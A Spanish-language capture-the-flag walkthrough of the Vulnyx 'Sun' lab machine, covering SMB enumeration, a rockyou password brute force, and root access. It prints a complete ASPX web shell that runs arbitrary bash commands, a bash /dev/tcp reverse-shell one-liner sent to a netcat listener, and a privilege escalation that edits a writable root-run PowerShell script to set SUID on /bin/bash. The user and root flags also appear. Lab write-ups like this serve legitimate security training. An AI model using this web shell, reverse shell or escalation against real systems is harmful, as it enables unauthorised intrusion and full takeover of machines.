---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Sun Vulnyx (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-29 03:39 EDT
Nmap scan report for 192.168.5.92
Host is up (0.0016s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp   open  http        nginx 1.22.1
|_http-title: Sun
|_http-server-header: nginx/1.22.1
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
8080/tcp open  http        nginx 1.22.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Sun
|_http-server-header: nginx/1.22.1
MAC Address: 08:00:27:8F:77:B9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -1s
| smb2-time: 
|   date: 2025-08-29T07:39:39
|_  start_date: N/A
|_nbstat: NetBIOS name: SUN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.12 seconds
```

Veremos que hay varios puertos, entre ellos esta el puerto `80` y el `8080` que si entramos veremos exactamente la misma pagina desde fuera, si realizamos un poco de `fuzzing` no veremos nada interesante, por lo que vamos a probar a listar los recursos de `SMB`.

## SMB

```shell
smbclient -L \\<IP> -N
```

No veremos nada interesante tampoco, por lo que vamos a realizar una enumeracion a dicho servidor de forma mas extensa.

```shell
enum4linux -a <IP>
```

Info:

```
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Aug 29 03:43:15 2025

 =========================================( Target Information )=========================================

Target ........... 192.168.5.92
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 192.168.5.92 )============================


[+] Got domain/workgroup name: WORKGROUP


 ================================( Nbtstat Information for 192.168.5.92 )================================

Looking up status of 192.168.5.92
        SUN             <00> -         B <ACTIVE>  Workstation Service
        SUN             <03> -         B <ACTIVE>  Messenger Service
        SUN             <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ===================================( Session Check on 192.168.5.92 )===================================
                                                                                                                                                             
                                                                                                                                                             
[+] Server 192.168.5.92 allows sessions using username '', password ''                                                                                       
                                                                                                                                                             
                                                                                                                                                             
 ================================( Getting domain SID for 192.168.5.92 )================================
                                                                                                                                                             
Domain Name: WORKGROUP                                                                                                                                       
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                                                         
                                                                                                                                                             
                                                                                                                                                             
 ===================================( OS information on 192.168.5.92 )===================================
                                                                                                                                                             
                                                                                                                                                             
[E] Can't get OS info with smbclient                                                                                                                         
                                                                                                                                                             
                                                                                                                                                             
[+] Got OS info for 192.168.5.92 from srvinfo:                                                                                                               
        SUN            Wk Sv PrQ Unx NT SNT Samba 4.17.12-Debian                                                                                             
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 =======================================( Users on 192.168.5.92 )=======================================
                                                                                                                                                             
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: punt4n0  Name: punt4n0   Desc:                                                                                

user:[punt4n0] rid:[0x3e8]

 =================================( Share Enumeration on 192.168.5.92 )=================================
                                                                                                                                                             
smbXcli_negprot_smb1_done: No compatible protocol selected by server.                                                                                        

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
        nobody          Disk      File Upload Path
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 192.168.5.92 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 192.168.5.92                                                                                                                 
                                                                                                                                                             
//192.168.5.92/print$   Mapping: DENIED Listing: N/A Writing: N/A                                                                                            

[E] Can't understand response:                                                                                                                               
                                                                                                                                                             
NT_STATUS_CONNECTION_REFUSED listing \*                                                                                                                      
//192.168.5.92/IPC$     Mapping: N/A Listing: N/A Writing: N/A
//192.168.5.92/nobody   Mapping: DENIED Listing: N/A Writing: N/A

 ============================( Password Policy Information for 192.168.5.92 )============================
                                                                                                                                                             
                                                                                                                                                             

[+] Attaching to 192.168.5.92 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] SUN
        [+] Builtin

[+] Password Info for Domain: SUN

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:                                                                                                         
                                                                                                                                                             
                                                                                                                                                             
Password Complexity: Disabled                                                                                                                                
Minimum Password Length: 5


 =======================================( Groups on 192.168.5.92 )=======================================
                                                                                                                                                             
                                                                                                                                                             
[+] Getting builtin groups:                                                                                                                                  
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting builtin group memberships:                                                                                                                      
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting local groups:                                                                                                                                   
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting local group memberships:                                                                                                                        
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting domain groups:                                                                                                                                  
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting domain group memberships:                                                                                                                       
                                                                                                                                                             
                                                                                                                                                             
 ==================( Users on 192.168.5.92 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                             
                                                                                                                                                             
[I] Found new SID:                                                                                                                                           
S-1-22-1                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                  
                                                                                                                                                             
S-1-22-1-1000 Unix User\punt4n0 (Local User)                                                                                                                 

[+] Enumerating users using SID S-1-5-21-3376172362-2708036654-1072164461 and logon username '', password ''                                                 
                                                                                                                                                             
S-1-5-21-3376172362-2708036654-1072164461-501 SUN\nobody (Local User)                                                                                        
S-1-5-21-3376172362-2708036654-1072164461-513 SUN\None (Domain Group)
S-1-5-21-3376172362-2708036654-1072164461-1000 SUN\punt4n0 (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                                                  
                                                                                                                                                             
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                            
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

 ===============================( Getting printer info for 192.168.5.92 )===============================
                                                                                                                                                             
No printers returned.                                                                                                                                        


enum4linux complete on Fri Aug 29 03:43:35 2025
```

Veremos mucha informacion, pero entre todo esto veremos esta linea de aqui:

```
S-1-5-21-3376172362-2708036654-1072164461-1000 SUN\punt4n0 (Local User)
```

Vemos un usuario, por lo que vamos a realizar `fuerza bruta` en `SMB` con dicho usuario a ver si encontramos algo.

## Netexec

Vamos a limpiar el `rockyou` a `UTF-8` para que no de errores.

```shell
iconv -f ISO-8859-1 -t UTF-8//TRANSLIT /<PATH>/rockyou.txt > rockyou_utf8.txt
```

Ahora si podremos utilizar dicho diccionario.

```shell
netexec smb <IP> -u 'punt4n0' -p rockyou_utf8.txt
```

Info:

```
...............................<RESTO_DE_CODIGO>...................................
SMB         192.168.5.92    445    SUN              [+] SUN\punt4n0:sunday
```

Veremos que ha funcionado, pero si probamos dichas credenciales por `SSH` veremos que no funciona, por lo que vamos a listar los recursos de `SMB` con dichas credenciales.

```shell
smbclient -L \\<IP> -U punt4n0
```

Info:

```
Password for [WORKGROUP\punt4n0]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
        punt4n0         Disk      File Upload Path
```

Veremos que aparece un recurso nuevo bastante interesante con el nombre del usuario en el que podremos subir archivos a dicho servidor.

```shell
smbclient //<IP>/punt4n0 -U punt4n0
```

Metemos como contraseña `sunday` y con esto estaremos dentro, si listamos veremos lo siguiente:

```
  .                                   D        0  Tue Apr  2 04:55:21 2024
  ..                                  D        0  Mon Apr  1 12:43:11 2024
  index.html                          N      263  Tue Apr  2 04:54:36 2024
  sun.jpg                             N    98346  Tue Apr  2 04:49:44 2024

                19480400 blocks of size 1024. 15774808 blocks available
```

Veremos que se esta compartiendo la pagina desde dicho servidor, por lo que vamos a probar a subir un archivo `PHP` a ver si funciona una `reverse shell`.

## Escalate user punt4n0

Si subimos el `PHP` con una `reverse shell` y entramos por el puerto `8080` que es donde se esta compartiendo, veremos que no funciona, nos descarga el archivo, por lo que no lo esta interpretando, vamos a probar con un archivo `.aspx` directamente.

> webshell.aspx

```apsx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>

<script runat="server">
    void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            lblOutput.Text = "Seleccione un comando o ingrese uno personalizado.";
        }
    }

    void ExecutePredefinedCommand(object sender, EventArgs e)
    {
        string command = ddlCommands.SelectedValue;
        txtCustomCommand.Text = command;
        ExecuteCommand(command);
    }

    void ExecuteCustomCommand(object sender, EventArgs e)
    {
        ExecuteCommand(txtCustomCommand.Text.Trim());
    }

    void ExecuteCommand(string command)
    {
        try
        {
            if (string.IsNullOrEmpty(command))
            {
                lblOutput.Text = "Por favor, ingrese un comando.";
                return;
            }

            StringBuilder output = new StringBuilder();
            output.AppendLine($"<strong>🔄 Ejecutando:</strong> <code>{Server.HtmlEncode(command)}</code>");
            output.AppendLine("<hr>");

            Process process = new Process();
            
            // Para Linux
            process.StartInfo.FileName = "/bin/bash";
            process.StartInfo.Arguments = $"-c \"{command.Replace("\"", "\\\"")}\"";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.CreateNoWindow = true;

            process.Start();
            
            string result = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();
            
            process.WaitForExit();

            output.AppendLine($"<strong>📊 Código de salida:</strong> {process.ExitCode}<br><br>");

            if (!string.IsNullOrEmpty(result))
            {
                output.AppendLine("<strong>✅ Salida:</strong>");
                output.AppendLine($"<pre>{Server.HtmlEncode(result)}</pre>");
            }

            if (!string.IsNullOrEmpty(error))
            {
                output.AppendLine("<strong>❌ Errores:</strong>");
                output.AppendLine($"<pre style='color: #dc3545;'>{Server.HtmlEncode(error)}</pre>");
            }

            lblOutput.Text = output.ToString();
        }
        catch (Exception ex)
        {
            lblOutput.Text = $"<strong>⚠️ Error:</strong> {Server.HtmlEncode(ex.Message)}";
        }
    }
</script>

<!DOCTYPE html>
<html>
<head>
    <title>Advanced Command Executor - CTF</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            margin: 40px; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            max-width: 1000px;
            margin: 0 auto;
        }
        h2 { 
            color: #333; 
            text-align: center;
            margin-bottom: 30px;
        }
        .section {
            margin-bottom: 25px;
            padding: 20px;
            border: 2px solid #e9ecef;
            border-radius: 10px;
        }
        .form-group { 
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        select, input[type="text"] {
            flex: 1;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
        }
        .btn {
            background: #007bff;
            color: white;
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            transition: background 0.3s;
        }
        .btn:hover { background: #0056b3; }
        .btn-danger { background: #dc3545; }
        .btn-danger:hover { background: #c82333; }
        pre {
            background: #f8f9fa;
            padding: 15px;
            border: 1px solid #dee2e6;
            border-radius: 8px;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
        }
        .output { 
            margin-top: 25px;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 10px;
            border-left: 4px solid #007bff;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>🛠️ Advanced System Command Executor</h2>
        <p style="text-align: center; color: #666;">CTF Challenge - Ethical Hacking Environment</p>
        
        <div class="section">
            <h3>📋 Comandos Predefinidos</h3>
            <form runat="server">
                <div class="form-group">
                    <asp:DropDownList ID="ddlCommands" runat="server" CssClass="form-control">
                        <asp:ListItem Value="whoami">whoami - Usuario actual</asp:ListItem>
                        <asp:ListItem Value="pwd">pwd - Directorio actual</asp:ListItem>
                        <asp:ListItem Value="ls -la">ls -la - Listar archivos</asp:ListItem>
                        <asp:ListItem Value="uname -a">uname -a - Info del sistema</asp:ListItem>
                        <asp:ListItem Value="id">id - Información de usuario</asp:ListItem>
                        <asp:ListItem Value="ps aux">ps aux - Procesos ejecutándose</asp:ListItem>
                        <asp:ListItem Value="netstat -tulpn">netstat -tulpn - Conexiones de red</asp:ListItem>
                        <asp:ListItem Value="cat /etc/passwd">cat /etc/passwd - Usuarios del sistema</asp:ListItem>
                    </asp:DropDownList>
                    <asp:Button ID="btnPredefined" runat="server" Text="Ejecutar" 
                               CssClass="btn" OnClick="ExecutePredefinedCommand" />
                </div>
            </form>
        </div>

        <div class="section">
            <h3>🎯 Comando Personalizado</h3>
            <form runat="server">
                <div class="form-group">
                    <asp:TextBox ID="txtCustomCommand" runat="server" 
                                placeholder="Ingrese comando personalizado" />
                    <asp:Button ID="btnCustom" runat="server" Text="Ejecutar" 
                               CssClass="btn" OnClick="ExecuteCustomCommand" />
                </div>
            </form>
        </div>

        <div class="output">
            <asp:Label ID="lblOutput" runat="server" Text="" />
        </div>
    </div>
</body>
</html>
```

Creado esto, vamos a subirlo al `SMB` de esta forma:

```shell
put webshell.aspx
```

Echo esto accederemos a dicho archivo de esta forma:

```
URL = http://<IP>:8080/webshell.aspx
```

Dentro de esta seccion en la ejecuccion de comandos pondremos lo siguiente:

```shell
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Antes de enviarlo nos pondremos a la escucha de esta forma:

```shell
nc -lvnp <PORT>
```

Ahora si enviamos el anterior comando y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 6666 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.92] 45274
bash: no se puede establecer el grupo de proceso de terminal (428): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
punt4n0@sun:~$ whoami
whoami
punt4n0
```

Veremos que ha funcionado, por lo que vamos a sanitizar la shell.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Ahora vamos a leer la `flag` del usuario:

> user.txt

```
3b16b996837f6e87ffb20ab19edb88b7
```

## Escalate Privileges

Si listamos el `/opt` veremos lo siguiente:

```
total 16
drwxr-xr-x  3 root root 4096 abr  2  2024 .
drwxr-xr-x 18 root root 4096 abr  1  2024 ..
drwx------  3 root root 4096 abr  1  2024 microsoft
-rwx---rw-  1 root root   97 abr  2  2024 service.ps1
```

Vemos que hay un archivo `service.ps1` bastante interesante, si leemos que contiene:

```powershell
$idOutput = id

$outputFilePath = "/dev/shm/out"

$idOutput | Out-File -FilePath $outputFilePath
```

Vemos que esta creando una variable con el comando `id` y que lo esta escribiendo en un archivo, si leemos dicho archivo veremos lo siguiente:

```shell
cat /dev/shm/out
```

Info:

```
uid=0(root) gid=0(root) grupos=0(root)
```

Vemos que esta ejecutando el comando que esta en dicha variable, esto nos hace pensar que se esta ejecutando cada `X` tiempo por `root` y como podemos modificar el script, vamos a realizar lo siguiente:

```shell
nano /opt/service.ps1

#Dentro del nano
$idOutput = chmod u+s /bin/bash

$outputFilePath = "/dev/shm/out"

$idOutput | Out-File -FilePath $outputFilePath
```

Lo guardamos y ahora tendremos que esperar un poco a ver si surge efecto.

Ahora si listamos la `bash`:

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1265648 abr 23  2023 /bin/bash
```

Veremos que ha funcionado, por lo que vamos a ejecutar lo siguiente para ser `root` directamente:

```shell
bash -p
```

Info:

```
bash-5.2# whoami
root
```

Con esto veremos que ya seremos `root`, por lo que vamos a leer la `flag` de `root`.

> root.txt

```
e1e7f5e01538acad8c272a5da450f9f6
```
